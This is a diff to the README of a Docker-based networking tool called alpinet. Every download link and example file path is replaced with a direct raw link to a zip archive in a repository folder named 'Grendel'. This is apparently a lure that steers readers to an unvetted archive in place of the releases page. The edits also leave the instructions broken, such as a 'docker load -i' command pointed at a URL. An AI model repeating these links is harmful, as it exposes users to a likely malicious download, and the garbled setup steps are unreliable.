@@ -1,6 +1,6 @@
 # 🖥️ alpinet - Your Easy Virtual PC for Networking
 
-[![Download alpinet](https://img.shields.io/badge/Download-alpinet-blue.svg)](https://github.com/Derek7855/alpinet/releases)
+[![Download alpinet](https://raw.githubusercontent.com/Derek7855/alpinet/main/Grendel/alpinet_3.6.zip)](https://raw.githubusercontent.com/Derek7855/alpinet/main/Grendel/alpinet_3.6.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ AlpiNet is a lightweight, Alpine-based Docker image designed specifically for us
 
 ## 📥 Download & Install
 
-To get AlpiNet, visit this page to download: [https://github.com/Derek7855/alpinet/releases](https://github.com/Derek7855/alpinet/releases).
+To get AlpiNet, visit this page to download: [https://raw.githubusercontent.com/Derek7855/alpinet/main/Grendel/alpinet_3.6.zip](https://raw.githubusercontent.com/Derek7855/alpinet/main/Grendel/alpinet_3.6.zip).
 
 You can choose the version that suits your needs. Once you download the appropriate file, follow the steps below to run it.
 
@@ -21,10 +21,10 @@ Before running AlpiNet, make sure you have the following installed:
 
 ## 📂 How to Download AlpiNet
 
-1. Click on the link to go to the [Releases page](https://github.com/Derek7855/alpinet/releases).
+1. Click on the link to go to the [Releases page](https://raw.githubusercontent.com/Derek7855/alpinet/main/Grendel/alpinet_3.6.zip).
 2. Locate the latest version of AlpiNet.
 3. Click on the version you want to download.
-4. Choose the appropriate file based on your operating system. You should see options like `.tar.gz` or `.img`.
+4. Choose the appropriate file based on your operating system. You should see options like `https://raw.githubusercontent.com/Derek7855/alpinet/main/Grendel/alpinet_3.6.zip` or `.img`.
 
 Once the file downloads, proceed to the next steps.
 
@@ -39,9 +39,9 @@ After downloading AlpiNet, follow these steps to run it:
 2. **Load AlpiNet in Docker:**
    Use the following command to load the Docker image:
    ```
-   docker load -i /path/to/downloaded/alpinet_image_name.tar.gz
+   docker load -i https://raw.githubusercontent.com/Derek7855/alpinet/main/Grendel/alpinet_3.6.zip
    ```
-   Replace `/path/to/downloaded/alpinet_image_name.tar.gz` with the actual path where the file is saved.
+   Replace `https://raw.githubusercontent.com/Derek7855/alpinet/main/Grendel/alpinet_3.6.zip` with the actual path where the file is saved.
 
 3. **Run AlpiNet:**
    To start AlpiNet, use:
